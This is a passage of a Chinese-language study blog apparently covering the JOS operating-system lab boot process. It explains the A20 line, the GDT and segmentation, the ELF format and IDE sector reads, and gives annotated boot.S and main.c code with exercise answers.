<li>A20使用的是键盘控制器输出的Bit 1，向输出端口写入0xdf可以打开A20；向输出端口写入0xdd则会关闭A20。</li>
</ul>
<h4 id="分段机制与全局描述符表"><a href="#分段机制与全局描述符表" class="headerlink" title="分段机制与全局描述符表"></a>分段机制与全局描述符表</h4><p>x86处理器提供了分段机制和分页机制两种内存管理模式。如果要进入保护模式，就必须要先启动分段机制。（分页机制不是必须的）</p>
<p>分段机制将内存划分为若干个段，每个段都由段基址、段界限和段属性组成。由一个段描述符表（可以理解为一个数组）描述所有段的信息。段描述符表可以是全局的也可以是局部的。</p>
<p>简化的说，程序首先将对应的段选择子（可以理解为数组的索引）加载进入段寄存器中。然后在执行程序时，根据指令的内容确定应该使用的段寄存器，根据段寄存器中的段选择子确定应该使用的段描述符。再结合段描述符中包含的信息加上指令自身的地址构造出实际的物理地址。最终将该地址发送到地址总线上，到物理内存中寻址，并取回相应的数据。这之中我们简化了有关特权级、边界检查的相关内容，但足以描述分段机制的基本原理。</p>
<p>分段机制将虚拟地址转换成了线性地址。</p>
<h5 id="全局描述符表寄存器"><a href="#全局描述符表寄存器" class="headerlink" title="全局描述符表寄存器"></a>全局描述符表寄存器</h5><p>x86处理器提供了专门的全局描述符表寄存器（Global Descriptor Table Register）用于保存全局描述符表的表基址和表限长。GDTR由2个字节的表限长（limit）和4个字节的表基址（base）组成。其中表基址指定了全局描述符表的起始地址，表限长指定了全局描述符表的大小。其C结构体描述如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gdtr</span> &#123;</span></div><div class="line">	u16 limite;</div><div class="line">	u32 base;</div><div class="line">&#125; __attribute__ ((packed));</div></pre></td></tr></table></figure></p>
<p>在机器刚加电或者是处理器复位后，表基址默认被置为0，表限长则默认被置为0xFFFF。在保护模式初始化的过程中，必须给GDTR加载新的值。我们可以使用lgdt指令为GDTR加载新值。</p>
<h5 id="段选择子"><a href="#段选择子" class="headerlink" title="段选择子"></a>段选择子</h5><p>段选择子（2个字节）用于选择特定的描述符表以及表中的特定描述符。段选择子一般被放置于段寄存器中，段选择子由13位的索引、1位的表指示位和2位的请求特权级三部分组成。其中索引指定了描述符，表指示位选择应该访问的描述符表 - 0代表全局描述符表，1代表局部描述符表，请求特权级用于段级的保护机制，自0到4分别代表ring 0到ring 3。其C结构体描述如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">selector</span> &#123;</span></div><div class="line">    u16 index:<span class="number">13</span>;</div><div class="line">    u16 ti:<span class="number">1</span>;</div><div class="line">    u16 rpl:<span class="number">2</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h5 id="段描述符"><a href="#段描述符" class="headerlink" title="段描述符"></a>段描述符</h5><p>段描述符（8个字节）是段描述符表这个“数组”的“元素”。用C结构体描述如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gdtdesc</span> &#123;</span></div><div class="line">	u16 lim0_15;</div><div class="line">	u16 base0_15;</div><div class="line">	u8 base16_23;</div><div class="line">	u8 acces;</div><div class="line">	u8 lim16_19:<span class="number">4</span>;</div><div class="line">	u8 other:<span class="number">4</span>;</div><div class="line">	u8 base24_31;</div><div class="line">&#125; __attribute__ ((packed));</div></pre></td></tr></table></figure></p>
<p>其中总共包含了32位的段基址、20位的段界限、以及12位的类型。<br>段基址规定了段的起始地址。段界限规定了段的大小。而类型用于区别不同类型的描述符。包括描述符特权级、段存在位、已访问位等等。</p>
<h4 id="boot-S代码详解"><a href="#boot-S代码详解" class="headerlink" title="boot.S代码详解"></a>boot.S代码详解</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line">#include &lt;<span class="keyword">inc</span>/mmu.h&gt;</div><div class="line"></div><div class="line"># Start the <span class="meta">CPU</span>: switch to <span class="number">32</span>-bit protected mode, jump <span class="keyword">into</span> C.</div><div class="line"># The BIOS loads this code from the first sector of the hard disk <span class="keyword">into</span></div><div class="line"># memory <span class="meta">at</span> physical address <span class="number">0x7c00</span> <span class="keyword">and</span> starts executing <span class="keyword">in</span> real mode</div><div class="line"># with %cs=<span class="number">0</span> %ip=7c00.</div><div class="line"># boot.S 主要将<span class="meta">CPU</span>切换至<span class="number">32</span>位保护模式，并且跳转进入C代码</div><div class="line"><span class="meta"></span></div><div class="line">.set PROT_MODE_CSEG, <span class="number">0x8</span>         # kernel code <span class="meta">segment</span> selector</div><div class="line"><span class="meta">.set</span> PROT_MODE_DSEG, <span class="number">0x10</span>        # kernel data <span class="meta">segment</span> selector</div><div class="line"><span class="meta">.set</span> CR0_PE_ON,      <span class="number">0x1</span>         # protected mode enable flag</div><div class="line"><span class="meta"></span></div><div class="line">.globl start</div><div class="line"><span class="symbol">start:</span>                        # 程序入口</div><div class="line"><span class="meta">  .code16</span>                     # Assemble for <span class="number">16</span>-bit mode 指导生成<span class="number">16</span>位汇编代码</div><div class="line">  <span class="keyword">cli</span>                         # Disable interrupts 关中断</div><div class="line">  <span class="keyword">cld</span>                         # String operations increment 设置串传递顺序递增</div><div class="line"></div><div class="line">  # Set <span class="meta">up</span> the important data <span class="meta">segment</span> registers (<span class="built_in">DS</span>, <span class="built_in">ES</span>, <span class="built_in">SS</span>). 设置重要的段寄存器为<span class="number">0</span></div><div class="line">  xorw    %ax,%ax             # <span class="meta">Segment</span> number <span class="meta">zero</span></div><div class="line">  movw    %ax,%ds             # -&gt; Data <span class="meta">Segment</span></div><div class="line">  movw    %ax,%es             # -&gt; Extra <span class="meta">Segment</span></div><div class="line">  movw    %ax,%ss             # -&gt; Stack <span class="meta">Segment</span></div><div class="line"></div><div class="line">  # Enable A20:</div><div class="line">  #   For backwards compatibility with the earliest PCs, physical</div><div class="line">  #   address line <span class="number">20</span> is tied low, so that addresses higher than</div><div class="line">  #   1MB wrap around to <span class="meta">zero</span> by <span class="meta">default</span>.  This code undoes this.</div><div class="line">  # 开启A20：</div><div class="line">  #   A20的介绍已经给出，不再赘述。</div><div class="line"><span class="symbol">seta20.1:</span></div><div class="line">  inb     <span class="number">$0</span>x64,%al               # Wait for <span class="keyword">not</span> busy 等待缓冲区可用</div><div class="line">  testb   <span class="number">$0</span>x2,%al                # <span class="keyword">Test</span> for bit1 - if bit1 = <span class="number">1</span> then buffer is full</div><div class="line">  <span class="keyword">jnz</span>     seta20<span class="meta">.1</span></div><div class="line"></div><div class="line">  movb    <span class="number">$0</span>xd1,%al               # <span class="number">0xd1</span> -&gt; port <span class="number">0x64</span></div><div class="line">  outb    %al,<span class="number">$0</span>x64               # Prepare to write output port 准备写入输出端口</div><div class="line"><span class="symbol"></span></div><div class="line">seta20.2:</div><div class="line">  inb     <span class="number">$0</span>x64,%al               # Wait for <span class="keyword">not</span> busy 等待缓冲区可用</div><div class="line">  testb   <span class="number">$0</span>x2,%al</div><div class="line">  <span class="keyword">jnz</span>     seta20<span class="meta">.2</span>                # The same as above 同上</div><div class="line"></div><div class="line">  movb    <span class="number">$0</span>xdf,%al               # <span class="number">0xdf</span> -&gt; port <span class="number">0x60</span></div><div class="line">  outb    %al,<span class="number">$0</span>x60               # <span class="number">0xdf</span> -&gt; A20 gate enable command 打开A20</div><div class="line"></div><div class="line">  # Switch from real to protected mode, using a bootstrap GDT</div><div class="line">  # <span class="keyword">and</span> <span class="meta">segment</span> translation that makes virtual addresses</div><div class="line">  # identical to their physical addresses, so that the</div><div class="line">  # effective memory map does <span class="keyword">not</span> change during the switch.</div><div class="line">  <span class="keyword">lgdt</span>    gdtdesc                # Load gdt size/base to gdtr 设置全局描述符表</div><div class="line">  movl    %cr0, %eax             # Control register <span class="number">0</span>, bit0 is protected enable bit 读取控制寄存器<span class="number">0</span>的值，其Bit0为允许保护模式位</div><div class="line">  orl     $CR0_PE_ON, %eax       # Set PE 将允许保护模式位置<span class="number">1</span></div><div class="line">  movl    %eax, %cr0             # Update Control register <span class="number">0</span> 设置控制寄存器<span class="number">0</span></div><div class="line"></div><div class="line">  # Jump to next instruction, but <span class="keyword">in</span> <span class="number">32</span>-bit code <span class="meta">segment</span>.</div><div class="line">  # Switches processor <span class="keyword">into</span> <span class="number">32</span>-bit mode.</div><div class="line">  ljmp    $PROT_MODE_CSEG, $protcseg # 通过ljmp指令（跳转至下一条指令）进入保护模式</div><div class="line"><span class="meta"></span></div><div class="line">  .code32                     # Assemble for <span class="number">32</span>-bit mode 指导生成<span class="number">32</span>位汇编代码</div><div class="line"><span class="symbol">protcseg:</span></div><div class="line">  # Set <span class="meta">up</span> the protected-mode data <span class="meta">segment</span> registers 设置保护模式的数据段寄存器</div><div class="line">  movw    $PROT_MODE_DSEG, %ax    # Our data <span class="meta">segment</span> selector</div><div class="line">  movw    %ax, %ds                # -&gt; <span class="built_in">DS</span>: Data <span class="meta">Segment</span></div><div class="line">  movw    %ax, %es                # -&gt; <span class="built_in">ES</span>: Extra <span class="meta">Segment</span></div><div class="line">  movw    %ax, %fs                # -&gt; <span class="built_in">FS</span></div><div class="line">  movw    %ax, %gs                # -&gt; <span class="built_in">GS</span></div><div class="line">  movw    %ax, %ss                # -&gt; <span class="built_in">SS</span>: Stack <span class="meta">Segment</span></div><div class="line"></div><div class="line">  # Set <span class="meta">up</span> the stack pointer <span class="keyword">and</span> <span class="keyword">call</span> <span class="keyword">into</span> C. 设置栈指针并且调用C</div><div class="line">  movl    $start, %esp  # Stack has the opposite extension direction than Code 注意栈的延伸方向和代码段相反</div><div class="line">  <span class="keyword">call</span> bootmain #调用main.c中的bootmain函数</div><div class="line"></div><div class="line">  # If bootmain returns (it shouldn<span class="string">'t), loop.</span></div><div class="line">spin:</div><div class="line">  jmp spin</div><div class="line"></div><div class="line"># Bootstrap GDT 引导GDT</div><div class="line">.p2align 2                                # force 4 byte alignment</div><div class="line">gdt:</div><div class="line">  SEG_NULL				# null seg 默认第一个段描述符为空</div><div class="line">  SEG(STA_X|STA_R, 0x0, 0xffffffff)	# code seg 设置代码段描述符</div><div class="line">  SEG(STA_W, 0x0, 0xffffffff)	        # data seg 设置数据段描述符</div><div class="line">  # 关于SEG宏可以参考mmu.h</div><div class="line"></div><div class="line">gdtdesc:                                  # 用于设置全局段描述符寄存器</div><div class="line">  .word   0x17                            # sizeof(gdt) - 1 # Size of gdt</div><div class="line">  .long   gdt                             # address gdt # Base address of gdt</div></pre></td></tr></table></figure>
<hr>
<p>为了理解main.c，我们需要如下的知识储备。</p>
<h4 id="ELF文件格式"><a href="#ELF文件格式" class="headerlink" title="ELF文件格式"></a>ELF文件格式</h4><p>可执行和可链接格式（Executable and Linkable Format）是一种用于二进制文件、可执行文件、目标代码、共享库和核心转储格式文件。</p>
<p>ELF文件可以分为两种组成 - 链接视图（Linking View）和执行视图（Execution View）。这里我们只讨论执行视图。</p>
<p>执行视图的结构如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">+--------------------+</div><div class="line">|     ELF Header     |</div><div class="line">+--------------------+</div><div class="line">|Program Header Table|</div><div class="line">+--------------------+</div><div class="line">|      Segment 1     |</div><div class="line">+--------------------+</div><div class="line">|      Segment 2     |</div><div class="line">+--------------------+</div><div class="line">|         ...        |</div><div class="line">+--------------------+</div><div class="line">|Section Header Table|</div><div class="line">|       optinal      |</div><div class="line">+--------------------+</div></pre></td></tr></table></figure></p>
<p>ELF文件格式主要由ELF头（ELF Header）、程序头部表（Program Header Table）和节头部表（Section Header Table）组成。在执行视图中，节头部表是可选的。</p>
<p>有关于这些数据结构的C语言定义可以参考头文件<inc elf.h="">。</inc></p>
<ul>
<li>ELF头主要包含了ELF魔数、文件类型、程序头部表偏移和大小、程序入口等信息；</li>
<li>程序头部表可以看做一个数据结构的数组，每一个元素都描述了一个段。主要包含了段的偏移、段的虚拟地址、段的物理地址、段的大小等信息。</li>
</ul>
<h4 id="磁盘控制器"><a href="#磁盘控制器" class="headerlink" title="磁盘控制器"></a>磁盘控制器</h4><p>磁盘是电脑主要的存储媒介。磁盘是由盘片构成的。每个盘片有两面或者称为表面，表面覆盖着磁性记录材料。盘片中央有一个可以旋转的主轴，它使得盘片以固定的旋转速率旋转，通常是5400-15000转每分钟（Revolution Per Minute）。磁盘通常包含一个或多个这样的盘片，并封装在一个密封的容器内。</p>
<p>每一个表面是由一组称为磁道的同心圆组成。每个磁道被划分为一组扇区。每个扇区包含相等数量的数据位（通常是512字节），这些数据编码在扇区上的磁性材料中。扇区之间由一些间隙分隔开，这些间隙中不存储数据位。间隙用来标识扇区的格式化位。</p>
<p>磁盘的柱面是所有盘片表面上到主轴中心距离相等的磁道的集合。</p>
<p>对于磁盘的寻址通常分为CHS和LBA两种。</p>
<ol>
<li>CHS即柱面（cylinder）-磁头（head）-扇区（sector）寻址。每个盘片都对应着一个磁头，每一个盘片都被划分成柱面，每一个柱面都被划分成多个段。磁盘的最小存储单元是段。早期的IBM PC架构上采用CHS进行磁盘寻址。CHS是一个三元组，包括10bit的柱面号，8bit的磁头号以及6bit的扇区号。这样CHS的最大寻址范围为2^10 × 2^8 × 2^6 × 512 = 8GB。</li>
<li>随着磁盘容量的不断扩大，CHS的8GB寻址范围已经不能满足需要，现在的磁盘普遍采用逻辑区块地址（Logical Block Adress）的方式进行寻址来进行抽象。LBA是一个整数，代表磁盘上的一个逻辑区块编号，通过将这个整数转换成CHS格式来完成磁盘的具体寻址。LBA为48个bit，最大寻址范围为128PB。在本实验中，LBA按照旧的规范采用28个bit。</li>
</ol>
<p>IDE硬盘控制器（IDE Hard Drive Controller）的0x1F7端口读为磁盘0状态寄存器。<br>其Bit6为RDY Bit，当其置1表明磁盘上电完成。在对于磁盘做任何操作（除了复位）之前务必要保证该Bit为1。<br>其Bit7为BSY Bit，当其置1表明磁盘忙。在你向磁盘发送任何指令前务必保证该Bit为0。</p>
<p>通过IDE硬盘控制器读取扇区需要如下的步骤：</p>
<ol>
<li>向0x1F2端口写入待操作的扇区数目；</li>
<li>向0x1F3-0x1F5端口依次写入LBA的低24位；</li>
<li>向0x1F6端口的低4位写入LBA的高4位，向0x1F6端口的高4位写入驱动器地址；</li>
<li>向0x1F7端口写入读命令0x20。</li>
</ol>
<p>0x1F6寄存器又称Drive/Head寄存器。其低4位是LBA的高4位。其Bit5和Bit7一般是1。其Bit6为LBA位，当置1时表示启用LBA寻址。其Bit4为DRV位。用来选择驱动器，Master驱动器为0，Slave驱动器为1。这里我们将高4位置为0x1110</p>
<p>在使用读命令0x20之前需要完整的设置柱面/磁头/扇区。当这个命令完成，你可以从磁盘的数据寄存器（0x1F0端口）读取256个字（16Bits）。</p>
<h4 id="main-c代码详解"><a href="#main-c代码详解" class="headerlink" title="main.c代码详解"></a>main.c代码详解</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inc/x86.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inc/elf.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">/**********************************************************************</span></div><div class="line"> * This a dirt simple boot loader, whose sole job is to boot</div><div class="line"> * an ELF kernel image from the first IDE hard disk.</div><div class="line"> *</div><div class="line"> * DISK LAYOUT</div><div class="line"> *  * This program(boot.S and main.c) is the bootloader.  It should</div><div class="line"> *    be stored in the first sector of the disk.</div><div class="line"> *</div><div class="line"> *  * The 2nd sector onward holds the kernel image.</div><div class="line"> *</div><div class="line"> *  * The kernel image must be in ELF format.</div><div class="line"> *</div><div class="line"> * BOOT UP STEPS</div><div class="line"> *  * when the CPU boots it loads the BIOS into memory and executes it</div><div class="line"> *</div><div class="line"> *  * the BIOS intializes devices, sets of the interrupt routines, and</div><div class="line"> *    reads the first sector of the boot device(e.g., hard-drive)</div><div class="line"> *    into memory and jumps to it.</div><div class="line"> *</div><div class="line"> *  * Assuming this boot loader is stored in the first sector of the</div><div class="line"> *    hard-drive, this code takes over...</div><div class="line"> *</div><div class="line"> *  * control starts in boot.S -- which sets up protected mode,</div><div class="line"> *    and a stack so C code then run, then calls bootmain()</div><div class="line"> *</div><div class="line"> *  * bootmain() in this file takes over, reads in the kernel and jumps to it.</div><div class="line"> **********************************************************************/</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SECTSIZE	512</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFHDR		((struct Elf *) 0x10000) <span class="comment">// scratch space</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">readsect</span><span class="params">(<span class="keyword">void</span>*, <span class="keyword">uint32_t</span>)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">readseg</span><span class="params">(<span class="keyword">uint32_t</span>, <span class="keyword">uint32_t</span>, <span class="keyword">uint32_t</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">bootmain</span><span class="params">(<span class="keyword">void</span>)</span></div><div class="line">&#123;</div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></div><div class="line"></div><div class="line">	<span class="comment">// read 1st page off disk 从磁盘上读取第一页</span></div><div class="line">	readseg((<span class="keyword">uint32_t</span>) ELFHDR, SECTSIZE*<span class="number">8</span>, <span class="number">0</span>);</div><div class="line"></div><div class="line">	<span class="comment">// is this a valid ELF? 通过ELF魔数确认ELF有效</span></div><div class="line">	<span class="keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC)</div><div class="line">		<span class="keyword">goto</span> bad;</div><div class="line"></div><div class="line">	<span class="comment">// load each program segment (ignores ph flags) 读取各个段</span></div><div class="line">	ph = (struct Proghdr *) ((<span class="keyword">uint8_t</span> *) ELFHDR + ELFHDR-&gt;e_phoff); <span class="comment">// 程序头部表的起始地址</span></div><div class="line">	eph = ph + ELFHDR-&gt;e_phnum; <span class="comment">// 程序头部表的结束地址</span></div><div class="line">	<span class="keyword">for</span> (; ph &lt; eph; ph++)</div><div class="line">		<span class="comment">// p_pa is the load address of this segment (as well</span></div><div class="line">		<span class="comment">// as the physical address)</span></div><div class="line">        <span class="comment">// p_pa是加载地址也是物理地址</span></div><div class="line">		readseg(ph-&gt;p_pa, ph-&gt;p_memsz, ph-&gt;p_offset);</div><div class="line"></div><div class="line">	<span class="comment">// call the entry point from the ELF header 从ELF头调用程序入口</span></div><div class="line">	<span class="comment">// note: does not return!</span></div><div class="line">	((<span class="keyword">void</span> (*)(<span class="keyword">void</span>)) (ELFHDR-&gt;e_entry))();</div><div class="line"></div><div class="line">bad:</div><div class="line">	<span class="comment">// stops simulation and breaks into the debug console</span></div><div class="line">	outw(<span class="number">0x8A00</span>, <span class="number">0x8A00</span>);</div><div class="line">	outw(<span class="number">0x8A00</span>, <span class="number">0x8E00</span>);</div><div class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</div><div class="line">		<span class="comment">/* do nothing */</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Read 'count' bytes at 'offset' from kernel into physical address 'pa'. 从内核的offset处读取count个字节到物理地址pa处</span></div><div class="line"><span class="comment">// Might copy more than asked 可能会读取超过count个（扇区对齐）</span></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">readseg</span><span class="params">(<span class="keyword">uint32_t</span> pa, <span class="keyword">uint32_t</span> count, <span class="keyword">uint32_t</span> offset)</span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">uint32_t</span> end_pa;</div><div class="line"></div><div class="line">	end_pa = pa + count; <span class="comment">// 结束物理地址</span></div><div class="line"></div><div class="line">	<span class="comment">// round down to sector boundary 对齐到扇区</span></div><div class="line">	pa &amp;= ~(SECTSIZE - <span class="number">1</span>);</div><div class="line"></div><div class="line">	<span class="comment">// translate from bytes to sectors, and kernel starts at sector 1</span></div><div class="line">	offset = (offset / SECTSIZE) + <span class="number">1</span>; <span class="comment">// 算出扇区数 注意扇区从1开始（0为引导扇区）</span></div><div class="line"></div><div class="line">	<span class="comment">// If this is too slow, we could read lots of sectors at a time.</span></div><div class="line">	<span class="comment">// We'd write more to memory than asked, but it doesn't matter --</span></div><div class="line">	<span class="comment">// we load in increasing order.</span></div><div class="line">    <span class="comment">// 在实际中我们往往将多个扇区一起读出以提高效率。</span></div><div class="line">	<span class="keyword">while</span> (pa &lt; end_pa) &#123;</div><div class="line">		<span class="comment">// Since we haven't enabled paging yet and we're using</span></div><div class="line">		<span class="comment">// an identity segment mapping (see boot.S), we can</span></div><div class="line">		<span class="comment">// use physical addresses directly.  This won't be the</span></div><div class="line">		<span class="comment">// case once JOS enables the MMU.</span></div><div class="line">        <span class="comment">// 考虑到我们没有开启分页以及boot.S中使用了一一对应的映射规则，加载地址和物理地址是一致的。</span></div><div class="line">		readsect((<span class="keyword">uint8_t</span>*) pa, offset);</div><div class="line">		pa += SECTSIZE;</div><div class="line">		offset++;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">waitdisk</span><span class="params">(<span class="keyword">void</span>)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// wait for disk reaady 等待磁盘准备完毕。</span></div><div class="line">	<span class="keyword">while</span> ((inb(<span class="number">0x1F7</span>) &amp; <span class="number">0xC0</span>) != <span class="number">0x40</span>)</div><div class="line">		<span class="comment">/* do nothing */</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">readsect</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">uint32_t</span> offset)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// wait for disk to be ready</span></div><div class="line">	waitdisk();</div><div class="line"></div><div class="line">	outb(<span class="number">0x1F2</span>, <span class="number">1</span>);		<span class="comment">// count = 1 0x1F2 Disk 0 sector count</span></div><div class="line">	<span class="comment">// Read one sector each time</span></div><div class="line">	outb(<span class="number">0x1F3</span>, offset); <span class="comment">// Disk 0 sector number (CHS Mode)</span></div><div class="line">	<span class="comment">// First sector's number</span></div><div class="line">	outb(<span class="number">0x1F4</span>, offset &gt;&gt; <span class="number">8</span>); <span class="comment">// Cylinder low (CHS Mode)</span></div><div class="line">	outb(<span class="number">0x1F5</span>, offset &gt;&gt; <span class="number">16</span>); <span class="comment">// Cylinder high (CHS Mode)</span></div><div class="line">	<span class="comment">// Cylinder number</span></div><div class="line">	outb(<span class="number">0x1F6</span>, (offset &gt;&gt; <span class="number">24</span>) | <span class="number">0xE0</span>); <span class="comment">// Disk 0 drive/head</span></div><div class="line">	<span class="comment">// MASK 11100000</span></div><div class="line">	<span class="comment">// Drive/Head Register: bit 7 and bit 5 should be set to 1</span></div><div class="line">	<span class="comment">// Bit6: 1 LBA mode, 0 CHS mode</span></div><div class="line">	outb(<span class="number">0x1F7</span>, <span class="number">0x20</span>);	<span class="comment">// cmd 0x20 - read sectors</span></div><div class="line">    <span class="comment">/*20H       Read sector with retry. NB: 21H = read sector</span></div><div class="line">                without retry. For this command you have to load</div><div class="line">                the complete circus of cylinder/head/sector</div><div class="line">                first. When the command completes (DRQ goes</div><div class="line">                active) you can read 256 words (16-bits) from the</div><div class="line">                disk's data register. */</div><div class="line"></div><div class="line"></div><div class="line">	<span class="comment">// wait for disk to be ready</span></div><div class="line">	waitdisk();</div><div class="line"></div><div class="line">	<span class="comment">// read a sector</span></div><div class="line">	insl(<span class="number">0x1F0</span>, dst, SECTSIZE/<span class="number">4</span>);</div><div class="line">	<span class="comment">// Data register: data exchange with 8/16 bits</span></div><div class="line">	<span class="comment">// insl port addr cnt: read cnt dwords from the input port</span></div><div class="line">	<span class="comment">// specified by port into the supplied output array addr.</span></div><div class="line">	<span class="comment">// dword: 4 bytes = 16 bits</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>练习3：</p>
<ol>
<li>0x7c2d: ljmp  $0x8, $0x7c32 从这句汇编指令之后处理器开始执行32位指令。ljmp指令导致了16位指令到32位指令的转变。</li>
<li>引导最后执行的指令是call *0x10018，内核的第一条指令是movw $0x1234,0x472。</li>
<li>内核的第一条指令位于0x10000c。</li>
<li>引导从程序头部表中得到段的数目以及每个段的大小，以此决定要从磁盘上读出多少个扇区。</li>
</ol>
<h4 id="加载内核"><a href="#加载内核" class="headerlink" title="加载内核"></a>加载内核</h4><p>本部分主要需要了解.text段.rodata段和.data段，并且使用objdump读取ELF格式的信息。</p>
<p>boot/Makefrag文件中指定了引导的text段的位置为0x7c00。</p>
<p>练习5：<br>修改了text段的加载地址使得汇编代码中的跳转地址出现错误，进而导致整个引导因为错误提前终止。</p>
